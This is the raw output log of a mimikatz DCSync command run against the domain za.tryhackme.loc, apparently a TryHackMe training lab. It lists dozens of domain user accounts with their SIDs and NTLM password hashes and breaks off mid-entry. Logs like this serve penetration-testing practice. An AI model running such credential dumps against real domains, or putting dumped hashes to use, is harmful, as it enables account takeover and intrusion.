Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
SAM Username         : justin.ward1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4738
Object Relative ID   : 4738

Credentials:
  Hash NTLM: a78c27c96707dfc8cfef0ea0e61fc8e1

Object RDN           : natasha.morgan

** SAM ACCOUNT **

SAM Username         : natasha.morgan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4739
Object Relative ID   : 4739

Credentials:
  Hash NTLM: 2e0c9ff0924a48d67c067526ebdf9eee

Object RDN           : tom.ahmed

** SAM ACCOUNT **

SAM Username         : tom.ahmed
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4740
Object Relative ID   : 4740

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : jack.armstrong

** SAM ACCOUNT **

SAM Username         : jack.armstrong
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4741
Object Relative ID   : 4741

Credentials:
  Hash NTLM: 36b4933eefd2a29086bcd5269bf821e1

Object RDN           : hazel.barnes

** SAM ACCOUNT **

SAM Username         : hazel.barnes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4742
Object Relative ID   : 4742

Credentials:
  Hash NTLM: 2177f21dafd487ffcd04b548c93a19ca

Object RDN           : lauren.davies

** SAM ACCOUNT **

SAM Username         : lauren.davies
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4743
Object Relative ID   : 4743

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : malcolm.gregory

** SAM ACCOUNT **

SAM Username         : malcolm.gregory
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4744
Object Relative ID   : 4744

Credentials:
  Hash NTLM: a90054ce478ba484cd3507d0e8d058bc

Object RDN           : leonard.thomas

** SAM ACCOUNT **

SAM Username         : leonard.thomas
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4745
Object Relative ID   : 4745

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : caroline.conway

** SAM ACCOUNT **

SAM Username         : caroline.conway
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4746
Object Relative ID   : 4746

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : abbie.smith1

** SAM ACCOUNT **

SAM Username         : abbie.smith1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4747
Object Relative ID   : 4747

Credentials:
  Hash NTLM: 5a4f9f3d1a76c278ccf81f91d1b76fda

Object RDN           : amber.jones

** SAM ACCOUNT **

SAM Username         : amber.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4748
Object Relative ID   : 4748

Credentials:
  Hash NTLM: 0727e2b8784b5379e889c8423bbd48d8

Object RDN           : mary.bowen

** SAM ACCOUNT **

SAM Username         : mary.bowen
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4749
Object Relative ID   : 4749

Credentials:
  Hash NTLM: c0c8fc84f304632fd0f6b5a3611e6789

Object RDN           : rachel.barker

** SAM ACCOUNT **

SAM Username         : rachel.barker
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4750
Object Relative ID   : 4750

Credentials:
  Hash NTLM: 1d12096c79e0241a6eff7308c0700ca9

Object RDN           : nicholas.clark

** SAM ACCOUNT **

SAM Username         : nicholas.clark
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4751
Object Relative ID   : 4751

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : marcus.hodgson

** SAM ACCOUNT **

SAM Username         : marcus.hodgson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4752
Object Relative ID   : 4752

Credentials:
  Hash NTLM: 9a8193cb8bd659e23788580fc06369a9

Object RDN           : ellie.smith

** SAM ACCOUNT **

SAM Username         : ellie.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4753
Object Relative ID   : 4753

Credentials:
  Hash NTLM: cde77633660d5d6de0ce1ee99c14aace

Object RDN           : iain.hill

** SAM ACCOUNT **

SAM Username         : iain.hill
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4754
Object Relative ID   : 4754

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : joe.butler

** SAM ACCOUNT **

SAM Username         : joe.butler
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4755
Object Relative ID   : 4755

Credentials:
  Hash NTLM: 1242baa85819129d7eb4bd888ad30bd5

Object RDN           : grace.robertson

** SAM ACCOUNT **

SAM Username         : grace.robertson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4756
Object Relative ID   : 4756

Credentials:
  Hash NTLM: 7973c1f160a6db40862d0007dd04ce6e

Object RDN           : lawrence.price

** SAM ACCOUNT **

SAM Username         : lawrence.price
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4757
Object Relative ID   : 4757

Credentials:
  Hash NTLM: a34aa5bb1289e4d02355232b7bb18a55

Object RDN           : jessica.mitchell

** SAM ACCOUNT **

SAM Username         : jessica.mitchell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4758
Object Relative ID   : 4758

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : michael.smith1

** SAM ACCOUNT **

SAM Username         : michael.smith1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4759
Object Relative ID   : 4759

Credentials:
  Hash NTLM: 6df6038cc5f56ffd825b076eb154f2b7

Object RDN           : lorraine.clark

** SAM ACCOUNT **

SAM Username         : lorraine.clark
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4760
Object Relative ID   : 4760

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : bradley.thomas

** SAM ACCOUNT **

SAM Username         : bradley.thomas
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4761
Object Relative ID   : 4761

Credentials:
  Hash NTLM: f120e1bff257412c80f2abe1417eded9

Object RDN           : judith.parker

** SAM ACCOUNT **

SAM Username         : judith.parker
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4762
Object Relative ID   : 4762

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : brenda.harrison

** SAM ACCOUNT **

SAM Username         : brenda.harrison
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4763
Object Relative ID   : 4763

Credentials:
  Hash NTLM: 37f2e62fee11c54cb4d92942e7eee97a

Object RDN           : jasmine.gibson

** SAM ACCOUNT **

SAM Username         : jasmine.gibson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4764
Object Relative ID   : 4764

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : dennis.oconnor

** SAM ACCOUNT **

SAM Username         : dennis.oconnor
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4765
Object Relative ID   : 4765

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : grace.pearce

** SAM ACCOUNT **

SAM Username         : grace.pearce
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4766
Object Relative ID   : 4766

Credentials:
  Hash NTLM: dc1b1576eadcfc055a4caf1aadd442ab

Object RDN           : brian.watson

** SAM ACCOUNT **

SAM Username         : brian.watson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4767
Object Relative ID   : 4767

Credentials:
  Hash NTLM: ac3a991c8a85d71e86d4daefc41177ea

Object RDN           : ben.noble

** SAM ACCOUNT **

SAM Username         : ben.noble
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4768
Object Relative ID   : 4768

Credentials:
  Hash NTLM: 22313c555044077328c1f216fb8a3203

Object RDN           : vanessa.harding

** SAM ACCOUNT **

SAM Username         : vanessa.harding
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4769
Object Relative ID   : 4769

Credentials:
  Hash NTLM: bc49d2f890fb0caec44f23aabd26a140

Object RDN           : georgia.holmes

** SAM ACCOUNT **

SAM Username         : georgia.holmes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4770
Object Relative ID   : 4770

Credentials:
  Hash NTLM: ca0ba499cefdfc3cabcca08d1aa4bc78

Object RDN           : leanne.sykes

** SAM ACCOUNT **

SAM Username         : leanne.sykes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4771
Object Relative ID   : 4771

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : malcolm.baxter

** SAM ACCOUNT **

SAM Username         : malcolm.baxter
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4772
Object Relative ID   : 4772

Credentials:
  Hash NTLM: c2eda79427b3df7d59835d9e591ba89a

Object RDN           : leanne.roberts1

** SAM ACCOUNT **

SAM Username         : leanne.roberts1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4773
Object Relative ID   : 4773

Credentials:
  Hash NTLM: bd688001cd1c999e2949f4d9d0e0b41b

Object RDN           : rosemary.chapman

** SAM ACCOUNT **

SAM Username         : rosemary.chapman
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4774
Object Relative ID   : 4774

Credentials:
  Hash NTLM: 13e4bd8fe2081777c84918d1203c7e3a

Object RDN           : charlene.dale

** SAM ACCOUNT **

SAM Username         : charlene.dale
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4775
Object Relative ID   : 4775

Credentials:
  Hash NTLM: 3b1f0e335cd46ff1cb1fc29abd5f8d2d

Object RDN           : clifford.gibson1

** SAM ACCOUNT **

SAM Username         : clifford.gibson1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4776
Object Relative ID   : 4776

Credentials:
  Hash NTLM: a13feff00167cfc072bf1e61b9a90624

Object RDN           : reece.thompson

** SAM ACCOUNT **

SAM Username         : reece.thompson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4777
Object Relative ID   : 4777

Credentials:
  Hash NTLM: 675072a6bcfb4a3236108a7d2195236c

Object RDN           : cheryl.mills

** SAM ACCOUNT **

SAM Username         : cheryl.mills
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4778
Object Relative ID   : 4778

Credentials:
  Hash NTLM: 2fdbe86086405c9bb975bcad4d5345fa

Object RDN           : lynda.stewart

** SAM ACCOUNT **

SAM Username         : lynda.stewart
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4779
Object Relative ID   : 4779

Credentials:
  Hash NTLM: 1aa093e11a0e2e9c21ba413cb91def0a

Object RDN           : jemma.hart

** SAM ACCOUNT **

SAM Username         : jemma.hart
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4780
Object Relative ID   : 4780

Credentials:
  Hash NTLM: ead0c0f516b2bd39a4b590c76172c714

Object RDN           : jemma.rowe

** SAM ACCOUNT **

SAM Username         : jemma.rowe
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4781
Object Relative ID   : 4781

Credentials:
  Hash NTLM: d97554b135d83defeab393bc3616e287

Object RDN           : janet.king

** SAM ACCOUNT **

SAM Username         : janet.king
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4782
Object Relative ID   : 4782

Credentials:
  Hash NTLM: 7917cefeec57f60dc88f5bbd51b9e296

Object RDN           : karen.rogers

** SAM ACCOUNT **

SAM Username         : karen.rogers
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4783
Object Relative ID   : 4783

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : leah.moss

** SAM ACCOUNT **

SAM Username         : leah.moss
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4784
Object Relative ID   : 4784

Credentials:
  Hash NTLM: e20f9abae3debf881eb2c4c7befae86b

Object RDN           : jeremy.smith

** SAM ACCOUNT **

SAM Username         : jeremy.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4785
Object Relative ID   : 4785

Credentials:
  Hash NTLM: ae1f55a126db37688592120180e33ae1

Object RDN           : alex.davies

** SAM ACCOUNT **

SAM Username         : alex.davies
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4786
Object Relative ID   : 4786

Credentials:
  Hash NTLM: f848319b45ba295f0d539fc0bcce91c5

Object RDN           : chelsea.hughes1

** SAM ACCOUNT **

SAM Username         : chelsea.hughes1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4787
Object Relative ID   : 4787

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : david.jones

** SAM ACCOUNT **

SAM Username         : david.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4788
Object Relative ID   : 4788

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : dale.young

** SAM ACCOUNT **

SAM Username         : dale.young
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4789
Object Relative ID   : 4789

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : owen.gibson

** SAM ACCOUNT **

SAM Username         : owen.gibson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4790
Object Relative ID   : 4790

Credentials:
  Hash NTLM: 3b4f3f839b6118958a898f7e4d1942f1

Object RDN           : ellie.baxter

** SAM ACCOUNT **

SAM Username         : ellie.baxter
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4791
Object Relative ID   : 4791

Credentials:
  Hash NTLM: c1089437e97da77c406d05ef89cdb82e

Object RDN           : michelle.power

** SAM ACCOUNT **

SAM Username         : michelle.power
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4792
Object Relative ID   : 4792

Credentials:
  Hash NTLM: 5088af465392d581a833f1f6f7add41c

Object RDN           : adam.johnson

** SAM ACCOUNT **

SAM Username         : adam.johnson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4793
Object Relative ID   : 4793

Credentials:
  Hash NTLM: 7d1c3d390b4c9567f3efbbf731c15682

Object RDN           : hayley.mitchell

** SAM ACCOUNT **

SAM Username         : hayley.mitchell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4794
Object Relative ID   : 4794

Credentials:
  Hash NTLM: 6aba16df5df927302b72ae298e9a7678

Object RDN           : clive.gill

** SAM ACCOUNT **

SAM Username         : clive.gill
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4795
Object Relative ID   : 4795

Credentials:
  Hash NTLM: 4363aa1175bf64be746ca5318c1ff49a

Object RDN           : bethan.hill

** SAM ACCOUNT **

SAM Username         : bethan.hill
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4796
Object Relative ID   : 4796

Credentials:
  Hash NTLM: e0a6d1aba269673af7a131a82c793002

Object RDN           : brandon.field

** SAM ACCOUNT **

SAM Username         : brandon.field
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-4797
Object Relative ID   : 4797

Credentials:
  Hash NTLM: b7618480015d24cbf14e9c5feb999531

Object RDN           : clare.atkins

** SAM ACCOUNT **

SAM Username         : clare.atkins
